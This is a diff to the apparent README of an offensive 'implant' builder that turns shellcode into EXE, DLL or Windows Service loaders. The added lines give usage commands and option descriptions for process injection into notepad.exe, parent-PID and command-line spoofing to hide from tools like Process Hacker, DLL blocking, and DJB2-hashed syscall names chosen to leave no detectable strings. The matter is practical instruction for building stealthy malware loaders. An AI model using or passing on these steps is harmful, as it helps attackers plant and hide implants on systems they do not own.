@@ -51,6 +51,15 @@ python run.py -i payload.bin -o implant.exe --inject callback
 # Remote thread injection into notepad.exe
 python run.py -i payload.bin -o implant.exe --inject remotethread --target notepad.exe
 
+# Build as injectable DLL
+python run.py -i payload.bin -o implant.dll --output-format dll
+
+# Build as Windows Service
+python run.py -i payload.bin -o implant.exe --output-format svc
+
+# Zero plaintext syscall names in SSN resolver (DJB2 hash comparison)
+python run.py -i payload.bin -o implant.exe --syscall-hash
+
 # Generate source only (no compilation)
 python run.py -i payload.bin --no-compile
 
@@ -99,6 +108,8 @@ The builder generates a self-contained C++ project (syscalls, resolver, injectio
 | `--spoof-cmdline` | — | disabled | Spoof command line in remote process PEB (hides real arguments from tools like Process Hacker) |
 | `--ppid-spoof <name>` | process name | disabled | Spoof parent PID by inheriting from named process (e.g. `explorer.exe`) |
 | `--block-dlls` | — | disabled | Block non-Microsoft-signed DLLs from loading into spawned process |
+| `--syscall-hash` | — | disabled | Replace plaintext syscall name strings with DJB2 hashes in SSN resolver (zero string footprint) |
+| `--output-format` | `pe`, `dll`, `svc` | `pe` | Output format: EXE (`pe`), DLL with `DllMain`/`Run` export (`dll`), Windows Service EXE (`svc`) |
 | `--debug` | — | disabled | Verbose debug output |
 
 ---
